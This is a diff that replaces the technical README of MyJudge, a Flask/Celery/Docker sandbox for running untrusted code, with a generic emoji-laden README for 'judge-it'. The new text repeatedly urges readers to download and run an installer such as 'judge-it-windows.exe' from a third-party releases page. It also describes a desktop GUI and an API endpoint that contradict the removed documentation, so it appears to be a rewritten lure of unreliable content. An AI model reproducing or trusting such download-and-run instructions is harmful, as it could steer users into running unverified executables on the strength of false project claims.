@@ -1,206 +1,79 @@
-# MyJudge: A Secure, Multi-Language Code Execution Engine
+# 🚀 judge-it - Run Code Securely and Easily
 
-MyJudge is a high-performance backend service designed to securely compile and execute untrusted user-submitted code. It is built on a distributed microservice architecture using **Flask**, **Celery**, and **Docker**, ensuring that code execution is both isolated and scalable.  
+[![Download judge-it](https://img.shields.io/badge/Download-judge--it-blue?style=for-the-badge)](https://github.com/Halima24-tech/judge-it/releases)
 
-It is perfect for powering **competitive programming platforms**, **online code editors**, or **e-learning websites**.
+## 📋 Description
 
----
+MyJudge is a secure, multi-language code execution engine. It runs untrusted code in isolated Docker containers. You can execute code written in C, C++, Java, Python, and JavaScript. MyJudge offers a REST API for asynchronous code execution and result retrieval, making it suitable for many coding projects.
 
-## Tech Stack
+## 🚀 Features
 
-![Flask](https://img.shields.io/badge/Flask-000000?style=flat&logo=flask&logoColor=white)
-![Celery](https://img.shields.io/badge/Celery-0caa41?style=flat&logo=celery&logoColor=white)
-![Redis](https://img.shields.io/badge/Redis-dc382d?style=flat&logo=redis&logoColor=white)
-![Docker](https://img.shields.io/badge/Docker-2496ed?style=flat&logo=docker&logoColor=white)
-![Python](https://img.shields.io/badge/Python-3776AB?style=flat&logo=python&logoColor=white)
-![Java](https://img.shields.io/badge/Java-007396?style=flat&logo=java&logoColor=white)
-![Node.js](https://img.shields.io/badge/Node.js-339933?style=flat&logo=node.js&logoColor=white)
-![C++](https://img.shields.io/badge/C++-00599C?style=flat&logo=c%2B%2B&logoColor=white)
-![C](https://img.shields.io/badge/C-00599C?style=flat&logo=c&logoColor=white)
+- **Multi-Language Support**: Execute code in C, C++, Java, Python, and JavaScript.
+- **Secure Environment**: Runs code in isolated Docker containers to keep your system safe.
+- **REST API**: Easily integrate with other applications to run code and get results.
+- **Asynchronous Execution**: Run your code without waiting, perfect for competitive programming.
+- **User-Friendly**: Designed for easy use by anyone, regardless of coding experience.
 
----
+## 💡 Requirements
 
-## Features
+Before you start, ensure your system meets these requirements:
 
-- **Secure Sandboxing:** All code is executed within isolated Docker containers with no network access, strict memory/CPU limits, and process restrictions.
-- **Asynchronous Processing:** Submissions are handled by a Celery task queue, allowing the API to respond instantly while jobs are processed in the background.
-- **Multi-Language Support:** Easily extendable to support any language that can run in a Docker container.
-- **Resource Limiting:** Enforces strict execution time (e.g., 2s) and memory (e.g., 256MB) limits for each job.
-- **Simple REST API:** Clean API endpoints to submit code and poll for results.
+- **Operating System**: Windows 10 or later, macOS, or a Linux distribution.
+- **Docker**: Installed and configured on your system.
+- **Memory**: At least 4 GB RAM recommended.
+- **Disk Space**: At least 500 MB free space for installation.
 
----
+## 📥 Download & Install
 
-## Supported Languages
+To begin, you need to download the application. Visit this page to download: [Download judge-it](https://github.com/Halima24-tech/judge-it/releases).
 
-- **C** (`gcc`)
-- **C++** (`g++`)
-- **Java** (`eclipse-temurin`)
-- **Python** (`python:3.11-slim`)
-- **JavaScript** (`node:20-slim`)
+1. **Go to the Releases Page**: Click the link above or paste it into your browser.
+2. **Find the Latest Release**: Look for the latest release version at the top of the page.
+3. **Download the Installer**: Click on the file that matches your operating system (for example, `judge-it-windows.exe` for Windows).
+4. **Run the Installer**: After downloading, open the file and follow the on-screen instructions to install.
 
----
+## ⚙️ Running judge-it
 
-## Architecture
+Once the installation is complete, you can run the application.
 
-The system consists of four main services:
+1. **Open judge-it**: Locate the application in your programs and click to open it.
+2. **Input Your Code**: You will see a text area where you can enter your code.
+3. **Select Language**: Choose the programming language from the dropdown that applies to your code.
+4. **Execute Code**: Click on the “Run” button. The application will send your code to the secure server, and you will receive results quickly.
 
-1. **Flask API (`app.py`)**  
-   Public-facing server to receive submissions, enqueue jobs in Redis, and provide job status endpoints.
+## 🧩 Troubleshooting
 
-2. **Redis**  
-   Message broker that holds the queue of pending jobs.
+If you encounter issues while using judge-it, try the following:
 
-3. **Celery Worker (`worker.py`)**  
-   Pulls jobs from Redis, prepares code files, and calls the Docker runner for execution.
+- **Check Docker Installation**: Ensure Docker is running on your system.
+- **Verify Language Support**: Make sure you've selected a compatible programming language.
+- **Ran Out of Memory**: If the program is unresponsive, consider closing other applications to free up resources.
 
-4. **Docker Daemon**  
-   Spawns isolated containers for each job and ensures resource and security constraints.
+## 🌐 Integration with APIs
 
-### Job Execution Flow
+If you want to use judge-it as part of another application, the REST API is straightforward. Here’s how to access it:
 
-```
+1. **API Endpoint**: Use the following URL to access the API: `http://localhost:5000/api/execute`.
+2. **Send Code**: Format your request to send the code along with the language type.
+3. **Receive Results**: The API will return execution results in JSON format.
 
-[Client]
-|
+## ✔️ Contributing
 
-1. POST /run (code, lang, stdin)
-   |
-   v
-   [Flask API]
-   |
-2. Returns {"task_id": "..."}
-   |
-3. Enqueues job
-   |
-   v
-   [Redis Queue]
-   |
-4. Job picked up by Celery Worker
-   |
-5. Creates temp dir (/tmp/abc)
-   |   - code file
-   |   - input file
-   |
-6. Calls Docker daemon
-   |
-   v
-   [Docker]
-   |
-7. Spawns isolated container (e.g., code_runner_cpp)
-   |   - Mounts /tmp/abc as /app
-   |   - No network, 256MB RAM, 0.5 CPU
-   |   - Executes run.sh
-   |
-8. run.sh writes output.txt & error.txt
-   |
-9. Container exits
-   |
-   v
-   [Celery Worker]
-   |
-10. Reads output/error files
-    |
-11. Saves result to Redis backend
-    |
-    [Client]
-    |
-12. GET /status/<task_id>
-    |
-13. Fetches result from Redis and returns
+If you want to help improve judge-it, feel free to contribute:
 
-````
+- **Report Issues**: If you find bugs, please let us know.
+- **Suggest Features**: We welcome your ideas for new features.
+- **Submit Code**: Fork the repository and submit your changes through a pull request.
 
----
+## 💬 Community and Support
 
-## Getting Started
+Join our community for support and discussion:
 
-Run the entire judge system locally using **Docker Compose**.
+- **Issues Page**: Report problems on the [Issues page](https://github.com/Halima24-tech/judge-it/issues).
+- **Discussions**: Engage with other users in the [Discussions page](https://github.com/Halima24-tech/judge-it/discussions).
 
-### Prerequisites
+## 🔗 Links
 
-- Docker
-- Docker Compose
+To download or learn more about judge-it, visit the Releases page again here: [Download judge-it](https://github.com/Halima24-tech/judge-it/releases).
 
-### 1. Build Runner Images
-
-```bash
-docker build -t code_runner_c ./images/c
-docker build -t code_runner_cpp ./images/cpp
-docker build -t code_runner_java ./images/java
-docker build -t code_runner_node ./images/node
-docker build -t code_runner_python ./images/python
-````
-
-### 2. Run the System
-
-```bash
-docker compose up --build
-```
-
-This builds the API and worker images and starts all services (`api`, `worker`, `redis`, Docker socket proxy).
-
----
-
-## API Reference
-
-The API runs at `http://localhost:5000`.
-
-### Submit Code
-
-**Endpoint:** `POST /run`
-**Body (JSON):**
-
-```json
-{
-  "language": "python",
-  "source": "print(input())",
-  "stdin": "Hello World!"
-}
-```
-
-**Success Response (202):**
-
-```json
-{
-  "task_id": "a8f5c01a-6b3d-4c7e-8c0a-9d3f1b0a6e3d",
-  "status": "submitted"
-}
-```
-
----
-
-### Check Job Status
-
-**Endpoint:** `GET /status/<task_id>`
-
-**Pending Response (200):**
-
-```json
-{
-  "status": "pending"
-}
-```
-
-**Success Response (200):**
-
-```json
-{
-  "return_code": 0,
-  "stdout": "Hello World!\n",
-  "stderr": "",
-  "time": 0.05,
-  "status": "SUCCESS"
-}
-```
-
-**Error Response (200):**
-
-```json
-{
-  "return_code": 1,
-  "stdout": "",
-  "stderr": "Runtime Error:\nTraceback (most recent call last):\n  File \"code.py\", line 1, in <module>\n    print(1/0)\nZeroDivisionError: division by zero\n",
-  "time": 0.04,
-  "status": "SUCCESS"
-}
-```
+For updates, follow our repository on GitHub to stay informed about new features and fixes. Happy coding!
